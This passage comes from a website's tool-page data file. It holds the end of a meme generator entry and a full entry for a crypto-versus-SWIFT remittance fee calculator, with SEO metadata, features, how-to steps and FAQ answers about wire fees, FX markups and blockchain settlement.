        question: "Are photos I upload into this meme generator ever sent to a server?",
        answer:
          "Never. When you select or drop an image file, the browser reads the bytes locally via the HTML5 `FileReader` / `URL.createObjectURL` API and paints them onto a local `<canvas>` element in your device's RAM. Nothing is uploaded over the network.",
      },
      {
        question: "Should I export my meme as PNG or WebP?",
        answer:
          "PNG uses lossless DEFLATE compression, preserving razor-sharp edges around high-contrast text strokes without JPEG block artifacts—making it ideal for pasting into X, Discord, and Slack. WebP offers 30–50% smaller file sizes while retaining sharp text if you are embedding the image on a website or blog.",
      },
      {
        question: "How does 'Copy Image to Clipboard' work in the browser?",
        answer:
          "The studio converts the HTML5 `<canvas>` element into a binary `image/png` `Blob` and writes it to your OS clipboard via the modern `navigator.clipboard.write([new ClipboardItem({ 'image/png': blob })])` API, allowing you to press `Cmd+V` or `Ctrl+V` directly inside any chat app.",
      },
    ],
    related: [
      "exif-metadata-remover",
      "bpm-tap-tempo-synth-frequency-studio",
      "morse-code-audio-flashlight-translator",
      "webcam-mic-hardware-privacy-tester",
    ],
    pillarUrl: "https://www.zerosuniverse.com/best-meme-making-apps/",
    pillarTitle: "10 Best Meme-Making Apps & Generators in 2026",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "crypto-remittance-fee-comparison-calculator",
    name: "Live Cross-Border Crypto (DOGE/XRP/USDC) vs SWIFT Fee Calculator",
    category: "apps",
    h1: "Live Cross-Border Crypto (DOGE, XRP, XLM, USDC) vs SWIFT Wire Fee Calculator (2026)",
    subhead:
      "Compare real-time international remittance costs—including hidden FX exchange-rate spreads, correspondent bank deductions, and on-ramp/off-ramp fees—across SWIFT wires, Wise, Western Union, Dogecoin, XRP, Stellar, and Layer-2 USDC.",
    primaryKeyword: "crypto cross border remittance calculator",
    secondaryKeywords: [
      "dogecoin xrp vs swift remittance fee calculator",
      "international wire transfer hidden fx markup",
      "usdc polygon solana cross border settlement",
      "crypto on ramp off ramp fee calculator",
    ],
    metaTitle: "Live Crypto (DOGE/XRP/USDC) vs SWIFT Cross-Border Fee Calculator (2026)",
    metaDescription:
      "Calculate the true total cost of sending money internationally. Compare SWIFT wire fees + 2.8% FX markups against Wise, Western Union, Dogecoin (DOGE), XRP, Stellar (XLM), and USDC on Base/Polygon/Solana.",
    features: [
      {
        title: "True End-to-End Remittance Cost Modeling",
        description:
          "Calculates realistic total costs across every rail—accounting for flat wire fees, hidden FX mid-market rate markups (0.4% to 3.5%), intermediary Nostro/Vostro cuts, AND crypto fiat on/off-ramp spreads.",
        icon: "Database",
      },
      {
        title: "Live CoinGecko Price & Network Fee Integration",
        description:
          "Fetches live USD market prices for Dogecoin (DOGE), XRP, Stellar (XLM), Solana (SOL), and Bitcoin (BTC) to convert native L1 gas fees into exact USD fractions of a cent.",
        icon: "Activity",
      },
      {
        title: "8-Rail Settlement Speed & Finality Matrix",
        description:
          "Compare settlement latency from 2–5 business days (SWIFT MT103 / ISO 20022 correspondent hops) down to 3–5 seconds on XRP Ledger, Stellar, Solana, and Base L2.",
        icon: "Zap",
      },
      {
        title: "Interactive Fiat On-Ramp / Off-Ramp Toggle",
        description:
          "Switch between 'Wallet-to-Wallet Native Crypto' (near-zero L1 fee) and 'Full Fiat Bank → Crypto → Local Fiat Bank' (including exchange conversion spreads) for honest apples-to-apples comparisons.",
        icon: "Shield",
      },
    ],
    useCases: [
      {
        title: "International Freelancer & Contractor Payout Optimization",
        description:
          "Compare how much a $1,000, $5,000, or $25,000 USD invoice loses to SWIFT wire fees and 2.8% bank FX spreads versus settling in USDC on Base/Polygon/Solana or XRP/DOGE.",
      },
      {
        title: "Cross-Border Trade & Remittance Corridor Analysis",
        description:
          "Evaluate why the World Bank reports a ~6.2% global average remittance cost on small transfers ($200–$500) and where low-fee crypto rails save the highest percentage.",
      },
      {
        title: "Blockchain Settlement Economics Education",
        description:
          "Understand the difference between pure L1 network transaction fees ($0.0002–$0.02) and the liquidity spread charged by local fiat off-ramps.",
      },
    ],
    howTo: [
      {
        name: "Enter Transfer Amount (USD) & Corridor Type",
        text: "Type your remittance amount (e.g., $500, $2,500, or $10,000) or click a preset transfer tier.",
      },
      {
        name: "Select Settlement Mode (Full Fiat-to-Fiat vs Wallet-to-Wallet)",
        text: "Toggle whether the sender and recipient need fiat bank conversion (on-ramp + off-ramp fee slider) or are settling directly wallet-to-wallet.",
      },
      {
        name: "Compare Net Recipient Payout Across All 8 Rails",
        text: "Review the ranked comparison table showing Flat Fee, FX/Ramp Spread, L1 Network Fee, Total Cost %, Settlement Time, and exact Net USD Received.",
      },
      {
        name: "Inspect Live Token Prices & Fee Breakdown",
        text: "Examine how many native units (DOGE, XRP, XLM, SOL) the transfer represents at current live market rates and how much you save vs a traditional bank wire.",
      },
    ],
    faq: [
      {
        question: "Why is the hidden FX exchange-rate markup usually larger than the upfront wire fee on bank transfers?",
        answer:
          "Banks often advertise a '$0 to $35 wire fee' for international transfers while quietly padding the foreign exchange rate by 2.0% to 3.5% above the interbank mid-market rate. On a $10,000 transfer, a 2.8% FX spread secretly costs $280—plus $15–$25 deducted by each intermediary correspondent bank (Nostro/Vostro) along the SWIFT route.",
      },
      {
        question: "Why are Dogecoin (DOGE), XRP, and Stellar (XLM) popular for cross-border value transfer?",
        answer:
          "All three networks were engineered or optimized for high-throughput, low-fee payments rather than heavy smart-contract computation: XRP Ledger and Stellar settle with deterministic finality in 3 to 5 seconds for roughly $0.0001–$0.001 per transaction, while Dogecoin processes 1-minute blocks with ~0.01–0.1 DOGE fees and deep global exchange liquidity.",
      },
      {
        question: "What is the advantage of using USDC on Layer-2 (Base/Polygon) or Solana vs volatile cryptocurrencies?",
        answer:
          "While DOGE and XRP have ultra-low network fees, their market price fluctuates against the US Dollar during transit or holding periods. Transferring native USDC on Solana, Base, Arbitrum, or Polygon combines sub-cent L1/L2 blockchain gas fees (<$0.005) and 2-second finality with 1:1 USD dollar stability—eliminating price volatility risk for B2B invoices.",
      },
      {
        question: "Why must you include fiat On-Ramp and Off-Ramp fees when comparing crypto to Wise or SWIFT?",
        answer:
          "If a sender holds USD in a bank account and the recipient needs local fiat currency (e.g., INR, PHP, MXN, EUR) in their local bank account, the pure L1 blockchain fee ($0.001) is only the middle hop. Buying the crypto (on-ramp) and selling it into local fiat (off-ramp) typically incurs a combined 0.2% to 1.0% exchange and withdrawal spread—which is still dramatically cheaper than a 3%–6% legacy remittance, but must be modeled honestly.",
      },
      {
        question: "How do SWIFT correspondent bank (Nostro/Vostro) deductions work?",
        answer:
          "SWIFT itself is a messaging network (MT103 / ISO 20022), not a settlement clearinghouse. When your domestic bank does not have a direct account relationship with a recipient's local bank abroad, the wire routes through 1 to 3 intermediary correspondent banks. Unless the sender explicitly pays extra for an `OUR` instruction, wires default to `SHA` (shared), allowing each intermediary bank to deduct $15–$30 directly from the principal amount in transit.",
      },
    ],
    related: [
      "india-salary-epfo-tds-calculator",
      "ai-api-token-cost-calculator",
      "standard-deviation-bell-curve-calculator",
      "zero-watermark-meme-generator-studio",
    ],
    pillarUrl:
      "https://www.zerosuniverse.com/dogecoin-revolutionize-cross-border-transactions-international-trade/",
    pillarTitle: "Can Dogecoin & Crypto Rails Revolutionize Cross-Border Trade?",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
];
